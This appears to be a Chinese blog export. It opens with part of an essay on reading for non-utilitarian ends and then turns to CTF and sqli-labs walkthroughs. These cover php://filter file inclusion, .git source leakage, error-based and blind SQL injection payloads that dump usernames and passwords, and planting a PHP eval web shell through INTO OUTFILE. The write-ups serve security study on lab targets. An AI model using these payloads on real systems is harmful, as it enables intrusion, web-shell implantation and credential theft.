<p>我并不否认读书会带来这些功利价值，但如果只是定睛于读书的功利性价值，那我要非常遗憾的告诉大家，我们在法大学的很多东西，将来可能都没有用处。</p>
<p>做律师，能赚大钱，那我为什么要学高数，难道要用高数数钱吗？</p>
<p>做大官，祖坟能冒烟，那我为什么要学法律，学学关系学、领导学就行了。</p>
<p>功利性读书必然让你接受成功主义的价值观，我们身处的社会弥漫的都是成功主义的哲学，你要成功，你要出名，你要成为人上人。</p>
<p>这几乎主宰了我们一切的价值观。</p>
<p>成功主义将成功作为评估一切价值的尺度，为了成功，你可以不折手段，你可以牺牲一切利益。</p>
<p>大家看过「魔鬼代言人」吧，年轻有为的律师凯文 基洛·里维斯扮演经过不住高薪豪宅的诱惑，带着妻子从家乡来到纽约发展。</p>
<p>在一个又一个成功中迷失了自己，为了追求利益和打赢官司，他放弃了律师操守，为了追逐胜诉，不惜隐瞒证据；他也牺牲了家庭，为了事业，他放弃了家庭，导致妻子自杀。</p>
<p>最后他才发现，他其实是魔鬼的私生子，成功全都来源于魔鬼的操控。魔鬼正是试图通过成功让我们放弃自己安身立命的美好价值。</p>
<p>在影片的结尾，魔鬼说了一句意味深长的话：</p>
<p>虚荣，无疑是我最爱的罪。</p>
<p>功利性读书让你只想成功，无法接受失败。</p>
<p>但我始终认为：</p>
<p>一个人的真正成功不是在于你取得多少辉煌，而是在挫折中，你能不能勇敢的爬起来。只有非功利性阅读，才能让你坦然接受失败。</p>
<p>在大量的与功利无关的文学作品、名人传记中，主人公的失败、困苦、绝望比比皆是。那么多伟大的灵魂，他们也曾有跌倒过的时候，你为什么不能跌倒。</p>
<p>功利性的读书让你只注重外在的功名，而忽视了内心的丰富。</p>
<p>孔门七十二贤，不乏博学多能者，高官厚禄者，但孔子最欣赏的学生却是单纯的颜回，“一箪食，一瓢饮，在陋巷，人不堪其忧，回也不改其乐”。</p>
<p>孔子说颜回好学，“有颜回者好学，不迁怒，不贰过。”也就是说颜回心态平和，情绪稳定，善于改过自新，注重德行。</p>
<p>这种内心的丰富在功利性阅读中，你不可能习得。</p>
<p>功利性读书会让人自高自大，孤标傲世。知识经常会让人骄傲给人带来智力上的优越感，让你瞧不起人，无法与人建立正常的人际关系。曹丕说“文人相轻，自古已然”。</p>
<p>为什么中国的文人总是互相瞧不上，这可能就是知识带来的恶果，因为知识让我们觉得自己与众不同，高人一等。</p>
<p>很多知识分子不懂得如何去配合，只懂得单打独斗，很长一段时间，中国都没有出现世界性的大师，一个很重要的原因，就是这些人过于骄傲。</p>
<p>在座的同学们中会出现大师吗？我不知道，但我想，如果你真的想为人类的进步作出贡献的话，你必须承认自己的无知与有限，必须与他人互相配合。</p>
<p>因此，读书的目的不能仅限于功利，必须去追逐非功利性的价值。</p>
<p>在我看来，读书的真正目的是追求智慧，而非单纯的知识。</p>
<p>从表面上来看，读书是一个一个悖论：让你在求知的过程中越来越觉得自己的无知。这就像苏格拉底所说的“承认自己的无知才是开启智慧的大门”。</p>
<p>庄子说：</p>
<p>吾生也有涯，而知也无涯，以有涯随无涯，殆已</p>
<p>这句话被很多人误读为励志名句。其实庄子的意思完全相反，庄子想说的是，生命是有限的，而知识是无限的，以有限的生命去追逐无限的知识，会把自己搞的非常疲倦的。</p>
<p>所罗门王也说过类似的话，“著书多，没有穷尽；读书多，身体疲倦”。</p>
<p>这些话表面上很消极，但他其实是想告诉我们，知识是无限的，在求知的过程中，必须对无限的知识保持足够的谦卑。</p>
<p>因此，读书首先可以培养自己对未知世界的敬畏。随着阅读的深入，你才能知道知识的大海是没有边界的，我们所知道的真的是太有限了。</p>
<p>读书可以激发我们对未知世界的探索，虽然知识的海洋是无限的，个体生命是有限的，但后人对庄子的误读有合理之处。</p>
<p>正是因为人类有智慧，不同于其他生物，因此我们必须用我们的智慧去探索未知世界的奥秘，然后更加感到宇宙的奇妙，避免人类的狂妄自大。</p>
<h3 id="二-读什么书？"><a href="#二-读什么书？" class="headerlink" title="二.读什么书？"></a>二.读什么书？</h3><p>刚才我们说过，读书的目的有功利性目的和非功利性目的。</p>
<p>前者是为了成功，后者是对前者进行纠偏：为了丰富自己的内心避免受到成功主义的荼毒，通过读书承认自己的有限，在浩瀚的宇宙面前保持足够的谦卑之心去不断探索宇宙的奥秘。</p>
<p>因此，读书也就分功利性阅读与非功利性阅读，前者就是大家从小到大，家长老师让大家好好读的书，没有太多可讲的。</p>
<p>大学四年，功利性阅读当然是必不可少的，你要学好专业，作为将来谋生的工具，你要学好英语，如果你不想将来和国际脱钩。</p>
<p>但更重要的是非功利性阅读，这可以让你感受真正的幸福。</p>
<p>那么，应该读什么书呢？</p>
<p>我觉得还是应该博观约取，厚积薄发。首先要“博观”，要“厚积”，广泛涉猎。</p>
<p>作为文科大学文史哲不分家，因此我们至少要通读重要的文学经典，在文学中，我们可以丰富我们人生的体验，文学来源于现实，虽然从表面上看主人公都是虚构的人物，但他们都是现实的折射。</p>
<p>文学可以让我们知道人生的多样性，人生不同路径的不同结果，它可以告诉学习到面临相同情境应该如何抉择。</p>
<p>文学作品还能极大地培养人的同理心，文学中无数个体的悲欢离合命运多舛，这能让我们体会人生的苦难与无常，我们会思想自己也是血肉之躯，苦难随时也会临到自身，故会感同身受，更会深刻领悟约翰多恩的布道词：</p>
<p>没有人是自成一体、与世隔绝的孤岛，每一个人都是广袤大陆的一部份。如果海浪冲掉了一块岩石，欧洲就减少。如同一个海岬失掉一角，如同你的朋友或者你自己的领地失掉一块。每个人的死亡都是我的哀伤，因为我是人类的一员。所以，不要问丧钟为谁而鸣，它就为你而鸣！</p>
<p>其次，我们必须要了解历史。如果说文学作品是虚构的人物，那历史就是真实人物的真实人生。</p>
<p>通过对历史的阅读，我们能够更深刻地了解人性的复杂，你会对人性的高贵赞叹不已，也会对人性邪恶不寒而栗；通过历史人物,我们也能反省自己，升华自己，去彰显人性的光辉，压制人性的幽暗。</p>
<p>历史中，无数鲜活的个体让我们认识到人性的不完美，从此我们可以拒绝人造的偶像。</p>
<p>正是因为对历的阅读，我才深刻了解法治的精神，因为人的不完美，因此人类的任何群体都有败坏的天性，所以对任何权力都要保持绝对的警惕。</p>
<p>权力导致腐败，绝对权力导致绝对腐败，任何权力都要套上法治的镣铐。</p>
<p>再次，哲学书也应看看。哲学是对人生观的探讨，这里说的哲学不是大家以前上课时学的哲学，那只是哲学中一个的门类，不过一家之言而已。</p>
<p>苏格拉底、柏拉图、亚里斯多德、奥古斯丁、阿奎那、西塞罗、马丁路德、加尔文、孟德斯鸠、洛克、波普尔、哈耶克等等。</p>
<p>这一连串名单，人类群星璀璨时，够你一生去阅读，通过对各类哲学著作的阅读，你可以追寻先贤的脚踪，去思索人从何而来，归向何方，一生应为何而活。</p>
<p>有兴趣的话，大家可以先从入门看起，如杜兰特的「哲学的故事」，看完后，你也许会慢慢爱上哲学。</p>
<p>除了文史哲，美术、音乐等各种艺术书籍都可涉猎。一个爱好艺术的人，他离善道应该更近一点。</p>
<p>不过这方面，我没有资格谈论，我自己艺术细胞很少。只看过几本美术史的著作，感觉很舒服，今后我也会在这方面补补课。</p>
<p>当然，“博观”“厚积”之后，就是约取。孟子说，尽信书不如无书，读书是对前人的经验的认识，必须有一个筛选的过程，绝不可人云亦云，要注意比较鉴别、明辨是非。</p>
<p>“吾爱吾师，吾更爱真理”，读书就像在真理之路的交通工具，有的交通工具走得快点，有的交通工具走的慢点，飞机飞得比火车快，但航班经常延误，而且到不了小村小寨，各种交通工具都有自己的利弊，因此什么书都可以读点，不可厚此薄彼。</p>
<p>另外，再好的交通工具如果走错方向，南辕北辙，那就麻烦了。通过读书，可以慢慢树立正确的价值观，就如选择正确的行驶路线。</p>
<h3 id="三-怎么读书？"><a href="#三-怎么读书？" class="headerlink" title="三.怎么读书？"></a>三.怎么读书？</h3><p>那么如何去读这些书呢？</p>
<p>这首先涉及去哪寻找这些书，老师们都会有自己的喜欢的书单上课时会给大家推荐，每年假期，我也会给大家推荐，如果大家有兴趣，也可以关注。</p>
<p>大学期间，同学们应该充分利用图书馆的资源，法大虽然不大但图书馆还是不错的，至少大学生应该阅读的主要书籍都有。</p>
<p>另外，如果大家想看新书的话，可以逛书店，经济条件允许的话，最好还是上书店买书。否则都在网上购书,实体书店也就都倒闭了。</p>
<p>给大家推荐几个书店，一个就是位于北大和清华之间的万圣书园，周末叫上三五知己，在万圣坐坐，看看书。谈恋爱的同学可以在书店旁边的醒客咖啡谈情说爱，顺便看看书，很浪漫、很温馨、很典雅。</p>
<p>另外一个稍微远点，在美术馆附近的三联书店的总店，也很不错，去故宫、景山公园是可以顺便逛逛。这两个书店的网站上每个月都有新书推荐，大家可以参考。</p>
<p>其次，大家也可以参加或组织读书小组，多人共同读书，每月读一两本好书，人不要太多，五六个人就可以了，每次由一两个同学做主报告人,其他同学参与讨论，在互动讨论中，你会有很多收获。</p>
<p>豆瓣上的读书小组也可以参加，但是我还是倾向人与人在现实空间中面对面的接触，这不仅可以读书，也可以阅人。</p>
<p>再次，关于读书的方法，一般的书籍都可以泛读，不要抱着读一本书要学多少东西的心态，否则就回到了功利主义的路子。</p>
<p>很多同学经常向我抱怨，老师我读书老记不住，读了后面就忘了前面。</p>
<p>其实为什么要记住呢？是为了写文章，还是为了在别人面前炫耀呢？</p>
<p>读书就是为了读书而读书，陶渊明说：</p>
<p>好读书，不求甚解；每有会意，便欣然忘食</p>
<p>在读书过程中，有那么片刻你能达到与书同乐，欣然忘食的境界，那就达到读书的目的了。你的内心就在潜移默化中慢慢被洗涤了。</p>
<p>当然，如果你觉得一本书泛读之后，非常不错，那你可以再读精读，对于书中的让你感动不已的语句，你可以记录下来，甚至可以发在微博上，人人上，让大家分享你的心得。</p>
<p>有很多书是可以反复读的。随着年龄的增长，阅历的丰富，同样一本书在不同时刻会给你不同的感动。</p>
<p>在大学四年中，我想大家至少要有几本放在床头的书，没事就翻翻，就像老朋友一样，有空就聊聊，等到书翻破翻黄，你对这个老朋友可能就会有更深的了解。</p>
<p>最后，很多书籍可以利用零碎的时间来读，比如坐公车坐地铁做火车坐飞机时，周末去逛万圣书店的路途中等等。</p>
<p>记得当年我读林达的「近距离看美国系列」 这个书学习法律的同学是一定要看的好像都是在做公车的时候看完的。</p>
<p>有同学会说，在车上看书伤眼睛，或者不方便，这可能也有道理，但是我看不少同学在无论多么拥挤的车上，也照样在看手机，玩游戏。如果把这些时间放在看书上，也许你会更充实。</p>
<p>卡夫卡说，一本书，必须是一把凿开我们心中冰海的利斧。</p>
<p>亲爱的同学们，你的心中有冰海吗？那么，就从现在开始读书吧！</p>
]]></content>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>php://filter 协议</title>
    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
<p><strong>1</strong>是格式<br><strong>2</strong>是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br><strong>3</strong>是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br><strong>4</strong>是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
<span id="more"></span>

<p>转base64编码：<code>convert.base64-encode</code></p>
<p>转大写：<code>string.toupper</code></p>
<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
<p>例题：</p>
<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
<p>构造：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
]]></content>
      <tags>
        <tag>php协议</tag>
      </tags>
  </entry>
  <entry>
    <title>scrabble的使用</title>
    <url>/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="scrabble介绍"><a href="#scrabble介绍" class="headerlink" title="scrabble介绍"></a>scrabble介绍</h1><p>scrabble适用常规的git泄露，用于获取源码。开发人员忘记.git文件，导致攻击者可以通过.git文件夹中的信息获取开发人员所提交过的源码。</p>
<p>安装：<code>git clone https://github.com/denny0223/scrabble</code>(用在linux系统中)</p>
<span id="more"></span>

<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143040320.png" alt="image-20220128143040320"></p>
<p>有时候获取不到，多试几次，毕竟github有时候进不去，呜呜呜。</p>
<h1 id="测试环境的搭建"><a href="#测试环境的搭建" class="headerlink" title="测试环境的搭建"></a>测试环境的搭建</h1><p>这里用Ubuntu和PHPstudy示范</p>
<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143248746.png" alt="image-20220128143248746"></p>
<p>进入根目录后，创建test测试文件</p>
<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143340203.png" alt="image-20220128143340203"></p>
<p>若出现如下情况，直接用命令行进入管理员模式访问吧。</p>
<p>进入管理员模式：<code>su root</code>，然后输入密码即可，注意，密码输入后是不会显示的。</p>
<p>然后切换到目的文件夹</p>
<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143610379.png" alt="image-20220128143610379"></p>
<p>这里我已经创建了几个文档和一个文件夹，文档的创建过程见Git教程，文件夹的创建<code>mkdir 文件夹名</code></p>
<p>所以，这里我们的测试网址应该是<code>http://127.0.0.1/test</code>。</p>
<p>顺便补充一下，我这里还搭建了sqli-labs靶场，虚拟机内访问是<code>http://127.0.0.1/sqli-labs</code>，物理机访问是要把127.0.0.1换成虚拟机的IP v4地址。查看方法如下</p>
<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128144009957.png" alt="image-20220128144009957"></p>
<h1 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h1><p>按照图中的指令即可</p>
<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128144150492.png" alt="image-20220128144150492"></p>
<p>注意，这里用完后，原来scrabble文件夹中的内容就被目标网站中的源码取代了，所以建议备份scrabble源文件，要不还得git clone一下。获取后直接cat查看就可以了。但是我试了一下，这里并不能获得sqli-labs的源文件，目测是因为sqli-labs中.git文件夹中的信息不太友好，本地对其并没有操作。所以也就没有git提交记录。</p>
<p><strong>还有一种情况是，flag会藏在老版本里，所以我们用scrabble获取源码后。输入<code>git log</code>查看以前版本，并切换，从而找到flag</strong></p>
<p>再补充一下，<code>git reflog</code>版本信息更全，能够看更先进的版本（如果有的话）。而<code>git log</code>只能看老版本</p>
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs第5、6关（报错注入）</title>
    <url>/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/</url>
    <content><![CDATA[<h1 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h1><p>按题意输入id=1，发现无回显，则不可用联合注入，题目说是双重注入，那就用双重注入。</p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123120136543.png" alt="image-20220123120136543"></p>
<h2 id="判断闭合类型"><a href="#判断闭合类型" class="headerlink" title="判断闭合类型"></a>判断闭合类型</h2><p>输入<code>id=1&#39;</code>报错，但是<code>id=1&#39;--+</code>不报错，说明是单引号闭合</p>
<span id="more"></span>

<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123120237851.png" alt="image-20220123120237851"></p>
<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p>order by 4无反应，order by 3有反应，则字段数为3</p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123120926386.png" alt="image-20220123120926386"></p>
<h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><code>?id=1&#39; union SELECT 1,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a--+</code></p>
<p>这里需要详细解释一下这个指令的原理</p>
<p>首先</p>
<p><code>select database()</code>是查看当前数据库，这不必多说。</p>
<p><code>select rand()</code>是随机生成0-1之间的数</p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123124535157.png" alt="image-20220123124535157"></p>
<p>而<code>floor(rand()*2)</code>则决定了，输出的不是0就是1。</p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123124807751.png" alt="image-20220123124807751"></p>
<p>其次是<code>concat(&#39;a&#39;,&#39;b&#39;)</code>这里是将括号里面的内容一块输出，这里假设是a和b</p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123125029180.png" alt="image-20220123125029180"></p>
<p>接着是<code>as 拟定名称 from 某个表 </code></p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123130004809.png" alt="image-20220123130004809"></p>
<p>当然，这里选择information_schema.tables也是有原因的，其原因就是 数据多。很大概率避免了只生成security0或者security1，（嘿嘿，当然别的表也可以，影响不大）</p>
<p>输入该语句后会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个成员表里有5个成员。这个就会返回五条记录，这里users表里有13个用户，所以返回了13条</p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123130104874.png" alt="image-20220123130104874"></p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123130134245.png" alt="image-20220123130134245"></p>
<p>接着是<code>group by 列名</code></p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123130239790.png" alt="image-20220123130239790"></p>
<p>该语句是将具有相同的数据整合到一个组，如上图所示</p>
<p>最后是<code>count(*)</code>如果上面的语句加上count(*)，就会出现如下两种情况</p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123131059687.png" alt="image-20220123131059687"></p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123131110019.png" alt="image-20220123131110019"></p>
<p>第一种情况前面的数字是对应security0或1的个数，而第二个则是报错。</p>
<p>我们希望他出现第二种情况，因为可以从报错信息中得到我们想要的数据。</p>
<p>而之所以会出现两种情况是因为，存在<strong>重复的键值</strong>，group by 后面的是虚拟表的主键</p>
<p><u>group by语句如果遇到重复的键值是不会再继续插入的。那么为什么会有重复的 security1 呢？这就是双查询注入的巧妙的之处了：<code>floor(rand()*2))</code> 产生的数只可能是0或1，而且会在插入前和插入时被执行两次（mysql官方说，在执行group by语句的时候，group by语句后面的字段会被运算两次。），且两次结果可能不同。比如：第一次插入了键值 security1 ，第二次产生了一个 security0 ，它于前者不重复，但由于rand()函数的随机性，真正插入时插入的可能是 security1 （插入时 <code>floor(rand()*2))</code> 又被执行了一次），这样就产生的重复的键值，而报错信息会告诉我们哪个键值重复，也就泄露了我们所想要的信息。</u></p>
<p>详细原因请参考<a href="https://blog.csdn.net/he_and/article/details/80455884">大佬文献</a></p>
<p>最后，前面加上1,是因为union具有严谨性，这个在第一关提到过，不再赘述。</p>
<p>这样就得到了当前数据库名</p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123133053294.png" alt="image-20220123133053294"></p>
<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p><code>?id=1&#39; union SELECT 1,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2))as a from information_schema.tables group by a--+</code></p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123133242521.png" alt="image-20220123133242521"></p>
<p>这个和第一关就大同小异了</p>
<h2 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h2><p><code>?id=1&#39; union SELECT 1,count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39;),floor(rand()*2))as a from information_schema.tables group by a--+</code></p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123133449087.png" alt="image-20220123133449087"></p>
<h2 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h2><p>尝试用第一关的语句查数据，结果发现都返回You are in……</p>
<p>则换为如图中所示命令</p>
<p><img src="/2022/01/23/sqlilabs%E7%AC%AC5%E3%80%816%E5%85%B3/image-20220123134624869.png" alt="image-20220123134624869"></p>
<p>这里仅仅是得出了第0行的用户名，若想得到密码，只更改username为password即可。若想得到第1行的数据，只需把0改为1即可，以此类推，即可得到所有用户名和密码。</p>
<h1 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h1><p>第六关和第五关没啥区别，就是闭合方式改变了一下。这里是双引号闭合，其余都一样，这里就不赘述了。</p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs第7关（上传木马）</title>
    <url>/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/</url>
    <content><![CDATA[<h1 id="配置关卡文件"><a href="#配置关卡文件" class="headerlink" title="配置关卡文件"></a>配置关卡文件</h1><p>首先，MySQL默认是不能通过sql上传文件的，具体请输入命令<code>show variables like &#39;%secure%&#39;</code> 查看</p>
<p>若图中划红线的框为</p>
<ul>
<li><p>Null  不可上传</p>
</li>
<li><p>某一路径 只能在该路径及其子路径中上传</p>
</li>
<li><p>空   可以上传</p>
<span id="more"></span></li>
</ul>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124202815420.png" alt="image-20220124202815420"></p>
<p>具体修改方法如下</p>
<p>打开my.ini文件，并在[mysqld]栏中添加如下内容</p>
<p><code>secure_file_priv=&quot;路径&quot;</code></p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124203529805.png" alt="image-20220124203529805"></p>
<p>然后重启MySQL即可生效。</p>
<p>以上步骤实际上是完善题目，因为此题本来就是用上传文件做，没法上传文件就是没法做。</p>
<h1 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h1><p>首先输入<code>id=1&#39;</code>，报错；然后输入<code>id=1&#39;--+</code>，还是报错；接着输入<code>id=1&#39;)--+</code>，还是报错；最后尝试输入<code>id=1&#39;))--+</code>，这次终于对了，所以闭合方式就是单引号加双括号。</p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204428285.png" alt="image-20220124204428285"></p>
<h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p>这个没啥好说的，直接<code>order by</code>即可最后得出是3</p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204525136.png" alt="image-20220124204525136"></p>
<h1 id="上传木马并连接"><a href="#上传木马并连接" class="headerlink" title="上传木马并连接"></a>上传木马并连接</h1><p><code>?id=1&#39;))union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\a.php&quot;--+</code>注意这里是<strong>双反斜杠</strong></p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204810866.png" alt="image-20220124204810866"></p>
<p>然后查看靶机中相应的文件即可知道已经成功上传</p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204957483.png" alt="image-20220124204957483"></p>
<p>然后用中国蚁剑进行连接</p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205105057.png" alt="image-20220124205105057"></p>
<p>注意，这里要定位到a.php，而不是仅仅到Less-7文件夹，连接成功后如下图</p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205159761.png" alt="image-20220124205159761"></p>
<h1 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h1><p><code>?id=1&#39;))union select 1,2,database() into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\b.txt&quot;--+</code> 这里换成<strong>b.txt</strong>了</p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205333775.png" alt="image-20220124205333775"></p>
<p>用蚁剑查看</p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205413565.png" alt="image-20220124205413565"></p>
<p>可知当前数据库是<strong>security</strong></p>
<h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p><code>?id=1&#39;))union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\c.txt&quot;--+</code>这里改成<strong>c.txt</strong>了，若仍是b.txt，则原先的b.txt不会改变，也不会新增内容。</p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205728524.png" alt="image-20220124205728524"></p>
<h1 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h1><p><code>?id=1&#39;))union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\d.txt&quot;--+</code></p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205953312.png" alt="image-20220124205953312"></p>
<h1 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h1><p><code>?id=1&#39;))union select 1,2,group_concat(username,1,password) from security.users into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\e.txt&quot;--+</code></p>
<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124210110521.png" alt="image-20220124210110521"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实就是上传了一个一句话木马，然后用蚁剑进行查看相应数据，指令大多和第一关相似。</p>
<p>特别之处就是用了<code>into outfile&quot;路径&quot;</code>这个语句。</p>
<p>最后想说的是，蚁剑真的可怕！！！</p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs第8-10关（盲注）</title>
    <url>/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/</url>
    <content><![CDATA[<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><h2 id="判断闭合类型"><a href="#判断闭合类型" class="headerlink" title="判断闭合类型"></a>判断闭合类型</h2><p>?id=1’报错，?id=1’–+不报错，说明是单引号包裹。</p>
<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p>这里要用到substr函数和ascii函数，顺便了解一下length函数</p>
<p>substr函数是截取某一字段的第几个字母，ascii函数是将某一字符转变成ascii码的形式，而length函数则是判断字符串的长度。</p>
<span id="more"></span>

<p><code>?id=1&#39; and (select ascii(substr(database(),1,1)))=1--+</code></p>
<p>这段语句表示，选取数据库名称的第一个字符，并判断其ascii码是否是1，如果是1则有回显，如果不是1就没有回显。<strong>第一个1表示从第一个字符截取，第二个1表示截取1位。</strong></p>
<p><code>id=1&#39; and length(database())=8--+</code></p>
<p>这段语句表示数据库名称的字符串长度为8，如果是8则有回显，如果不是8就没有回显（这条语句在本题没有使用）</p>
<p>使用bp设置好变量，如图，开始爆破。</p>
<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126103005854.png" alt="image-20220126103005854"></p>
<p>爆破结果如下</p>
<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126103224065.png" alt="image-20220126103224065"></p>
<p>可得数据库</p>
<p>115,101,99,117,114,105,116,121=&gt;security</p>
<p>这里推荐去<a href="https://www.sojson.com/ascii.html">这里</a>按ctrl+f直接搜ascii对应字符。</p>
